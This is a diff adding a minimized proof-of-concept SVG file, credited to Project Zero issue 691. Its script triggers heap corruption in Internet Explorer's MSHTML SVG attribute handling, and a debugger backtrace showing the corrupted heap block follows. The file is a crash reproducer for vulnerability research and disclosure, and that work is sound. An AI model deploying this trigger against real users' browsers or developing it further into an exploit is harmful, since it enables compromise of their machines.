@@ -1,0 +1,42 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=691
+
+Minimized PoC:
+-->
+
+<svg xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink">
+<pattern id="outer"><rect id="rect"><pattern id="inner"></pattern></rect></pattern>
+<script><![CDATA[
+  function handler() {
+    inner.setAttribute("viewBox");
+  }
+  outer.addEventListener("DOMAttrModified", function () { handler(); });
+  doc = document.implementation.createDocument("", "", null);
+  doc.adoptNode(rect.attributes[0]);
+]]></script>
+</svg>
+
+<!--
+Backtrace for reference:
+
+2:052:x86> k 10
+ChildEBP RetAddr
+WARNING: Stack unwind information not available. Following frames may be wrong.
+0bb14b64 6ad180b8 vrfcore!VerifierStopMessageEx+0x571
+0bb14b88 67fec434 vrfcore!VerifierDisableVerifier+0x748
+0bb14bdc 67fea3dc verifier_67fe0000!VerifierStopMessage+0x74
+0bb14c40 67fe733d verifier_67fe0000!AVrfpDphReportCorruptedBlock+0x10c
+0bb14ca4 67fe7495 verifier_67fe0000!AVrfpDphFindBusyMemoryNoCheck+0x7d
+0bb14cc8 67feb651 verifier_67fe0000!AVrfpDphFindBusyMemory+0x15
+0bb14ce0 67ff0b12 verifier_67fe0000!AvrfpDphCheckPageHeapAllocation+0x41
+0bb14cf0 67f93246 verifier_67fe0000!VerifierCheckPageHeapAllocation+0x12
+0bb14d4c 60dca53f vfbasics+0x13246
+0bb14d68 604cce4e MSHTML!MemoryProtection::HeapFree+0x46
+0bb14d70 60b07866 MSHTML!ProcessHeapFree+0x10
+0bb14d88 60baac6b MSHTML!CSVGHelpers::SetAttributeStringAndPointer<CRectF,CSVGRe
+ct>+0xb6
+0bb14de8 60e18b69 MSHTML!PROPERTYDESC::HandleStringProperty+0x110
+0bb14e14 607e30e6 MSHTML!PROPERTYDESC::CallHandler+0x855996
+0bb14e54 60b83323 MSHTML!CElement::SetAttributeFromPropDesc+0xbe
+0bb14ee4 607e2f44 MSHTML!CElement::ie9_setAttributeNSInternal+0x2ee
+-->
